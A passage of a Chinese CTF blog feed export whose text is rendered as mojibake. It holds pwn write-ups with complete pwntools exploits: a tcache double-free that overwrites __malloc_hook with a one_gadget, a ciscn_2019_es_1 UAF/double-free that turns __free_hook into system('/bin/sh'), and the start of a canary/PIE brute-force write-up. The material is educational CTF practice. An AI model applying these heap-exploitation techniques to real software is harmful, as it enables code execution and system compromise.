index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…·æœ‰tcache,ç”¨overlapï¼Œå¯ä»¥ä¿®æ”¹size&gt;0x408å†æ¬¡freeæ—¢å¯è¿›å…¥</span></span><br><span class="line"><span class="comment"># unsorted bin ç„¶åè¾“å‡ºæ³„æ¼libc</span></span><br><span class="line"><span class="comment"># æŸ¥è¯¢wpï¼Œå‘ç°ç”¨double free</span></span><br><span class="line">onegadget = <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># æ­¤æ—¶ tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># ä¿®æ”¹sizeä¸º0x421</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin æ­¤æ—¶chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># åˆ‡å‰²unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># è°ƒç”¨onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆé‡tcache-double_free</title>
      <link href="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/"/>
      <url>/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h1><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_es_1">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font size="4" color="red">è¦ç‚¹ï¼š</font></p><ul><li>è™½ç„¶è¯´tcacheçš„double freeæ¼æ´åœ¨glibc2.30ä¹‹åæ‰å®Œå¤‡ï¼Œä½†æ˜¯glibc2.27ä¸­ä¹Ÿæœ‰ç‰ˆæœ¬å…·å¤‡è¯¥æ£€æµ‹</li><li>æˆ‘æœ€å¼€å§‹ç”¨çš„2.27-3ubuntu1.5_amd64å°±æ˜¯ä¸å¯ä»¥çš„ï¼Œä½†æ˜¯æ­¤é¢˜ç›®æ˜¯æ²¡æœ‰è¯¥æ£€æŸ¥çš„ï¼Œæœ¬åœ°æµ‹è¯•å¯ä»¥ç”¨2.27-3ubuntu1_amd64</li></ul><h1 id="idaé€Ÿè§ˆ"><a href="#idaé€Ÿè§ˆ" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h1><ul><li><strong>ç»å…¸çš„å †èœå•ï¼Œä½†æ˜¯glibc2.27å…·æœ‰tcache</strong></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hate 2.29 , can you understand me?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;maybe you know the new libc&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(); <span class="comment">// èœå•</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        call(); <span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jack Ma doesn&#x27;t like you~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç±»ä¼¼å½¢æˆä¸€ä¸ªç»“æ„ä½“</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line">    Chunk* chunk;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202526933.bmp"></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202709261.bmp"></p><h2 id="call-free"><a href="#call-free" class="headerlink" title="call(free)"></a>call(free)</h2><ul><li><strong>å¾ˆæ˜æ˜¾çš„uafæ¼æ´</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202720899.bmp"></p><h1 id="ç®€å•åˆ†æ"><a href="#ç®€å•åˆ†æ" class="headerlink" title="ç®€å•åˆ†æ"></a>ç®€å•åˆ†æ</h1><ul><li>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œæœ‰uafæ¼æ´ï¼Œfreeæ‰çš„æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶</li><li>å…ˆmalloc(0x410) ç»•è¿‡tcacheè¿›å…¥unsorted binï¼Œç„¶åç›´æ¥showå°±å¯ä»¥æ³„éœ²libcï¼Œä¹Ÿå¯ä»¥malloc(0x80)ï¼Œç„¶åfree8æ¬¡ï¼Œå†showä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ˜¯å› ä¸ºæ­¤é¢˜ç›®æ²¡æœ‰double freeæ£€æŸ¥</li><li>ç„¶ådouble freeæ”¹free_hookä¸ºsystemï¼Œå°±å·®ä¸å¤šäº†ï¼Œè·Ÿä¹‹å‰ä¸€æ ·çš„æ­¥éª¤</li></ul><h1 id="gdbåŠ¨è°ƒ"><a href="#gdbåŠ¨è°ƒ" class="headerlink" title="gdbåŠ¨è°ƒ"></a>gdbåŠ¨è°ƒ</h1><h2 id="ç»•è¿‡tcache-æ³„éœ²libc"><a href="#ç»•è¿‡tcache-æ³„éœ²libc" class="headerlink" title="ç»•è¿‡tcache+æ³„éœ²libc"></a>ç»•è¿‡tcache+æ³„éœ²libc</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># ç»•è¿‡tcacheè¿›å…¥unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®€å•çš„æ³„æ¼libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li>å…ˆmalloc(0x410)ï¼ˆï¼0x408ï¼‰ç»•è¿‡tcacheï¼Œåé¢ä¸¤ä¸ªmallocæ˜¯ä¸ºäº†ä¿®æ”¹free_hookå’Œæœ€åçš„getshell</li><li>free(chunk0)ä¹‹å,å¦‚ä¸‹ï¼Œæ­¤æ—¶fdå’ŒbkæŒ‡å‘çš„æ˜¯<strong>main_arena+96ï¼Œè€Œä¸æ˜¯88äº†</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922205929434.bmp"></p><ul><li>ç”±äºæ­¤æ—¶çš„æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå¯ä»¥ç›´æ¥showï¼Œæ³„éœ²libc</li></ul><h2 id="double-free-getshell"><a href="#double-free-getshell" class="headerlink" title="double free+getshell"></a>double free+getshell</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># glibc2.30æ‰æœ‰çš„double freeçš„æ£€æŸ¥</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"># æ­¤æ—¶ tcache bin ä¸­ 1 -&gt; 1</span><br><span class="line">add(0x20,p64(free_hook),b&#x27;1&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbb&#x27;,b&#x27;1&#x27;)</span><br><span class="line">add(0x20,p64(system),b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>double freeä¹‹åï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922210438537.bmp"></p><ul><li><font color="red">ç¬¬ä¸€æ¬¡add:</font></li></ul><p>ä¿®æ”¹äº†tcache binä¸­chunkçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘__free_hook,åªéœ€è¦ä¸¤æ¬¡mallocå°±å¯ä»¥mallocåˆ°free_hook,è¿›è¡Œä¿®æ”¹</p><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211627712.bmp"></p><ul><li><font color="red">ç¬¬äºŒæ¬¡add(æ— ç”¨çš„chunk):</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211649330.bmp"></p><ul><li><font color="red">ç¬¬ä¸‰æ¬¡add:</font></li></ul><p>å¯ä»¥çœ‹åˆ°__free_hookæŒ‡å‘äº†systemï¼Œè°ƒç”¨free-&gt;free_hook-&gt;system</p><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922212154845.bmp"></p><ul><li>æœ€åç›´æ¥free(2)å³å¯ï¼Œç›¸å½“äºsystem(â€œ&#x2F;bin&#x2F;shâ€)</li></ul><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26786)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Chunk&#123;</span></span><br><span class="line"><span class="string">    Chunk* chunk;</span></span><br><span class="line"><span class="string">    int size;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,call</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input compary call:\n&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># ç»•è¿‡tcacheè¿›å…¥unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç®€å•çš„æ³„æ¼libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># glibc2.30æ‰æœ‰çš„double freeçš„æ£€æŸ¥</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¤æ—¶ tcache bin ä¸­ 1 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¼ªéšæœº+çˆ†ç ´canary+çˆ†ç ´PIE</title>
      <link href="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/"/>
      <url>/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/</url>
      
        <content type="html"><![CDATA[<h1 id="idaé€Ÿè§ˆ"><a href="#idaé€Ÿè§ˆ" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><font color="red">é¢˜ç›®æ¥è‡ªï¼šbasectf</font></p><p><font color="red">é¢˜è§£å‚è€ƒï¼š<a class="link" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">å®˜æ–¹wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><h1 id="checksec-idaé€Ÿè§ˆ"><a href="#checksec-idaé€Ÿè§ˆ" class="headerlink" title="checksec+idaé€Ÿè§ˆ"></a>checksec+idaé€Ÿè§ˆ</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">Arch:       amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line"><span class="comment">// ä¿æŠ¤å…¨å¼€ï¼Œæ³¨æ„PIE</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150140743.bmp"></p><ul><li><p>ç¬¬ä¸€ä¸ªçº¢æ¡†ï¼Œä¼ªéšæœºæ•°çš„ç»•è¿‡ï¼Œåªè¦libcä¸€è‡´ï¼Œæ—¶é—´ä¸€è‡´ï¼Œç®—æ³•ä¸€è‡´ï¼Œæ‰€äº§ç”Ÿçš„éšæœºæ•°ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p></li><li><p>ç¬¬äºŒä¸ªçº¢æ¡†forkåˆ›å»ºå­è¿›ç¨‹ï¼Œè™½ç„¶åˆ›å»ºå­è¿›ç¨‹æ˜¯ä»å¤´å¼€å§‹ï¼Œä½†æ˜¯canaryæ˜¯ä¸å˜çš„ï¼Œè¿™é‡Œå¯ä»¥çˆ†ç ´canary</p></li><li><p>ç¬¬ä¸‰ä¸ªçº¢æ¡†æ˜¯æ ¸å¿ƒå‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥çˆ†ç ´canaryå’Œæ ˆæº¢å‡ºåˆ°shellå‡½æ•°ã€‚</p></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150603492.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150659629.bmp"></p><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><ul><li>ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯ç»•è¿‡ä¼ªéšæœºæ•°ï¼Œè¿™é‡Œç”¨åˆ°pythonä¸­çš„ctypesåº“ï¼Œå…ˆç”¨æœ¬åœ°çš„libcæ¼”ç¤ºï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="comment"># æœ¬åœ°libc</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>) <span class="comment"># æ—¶é—´ç§å­ï¼Œ0ä»£è¡¨æœ¬åœ°æ—¶é—´</span></span><br><span class="line">libc.srand(seed) </span><br><span class="line"></span><br><span class="line"><span 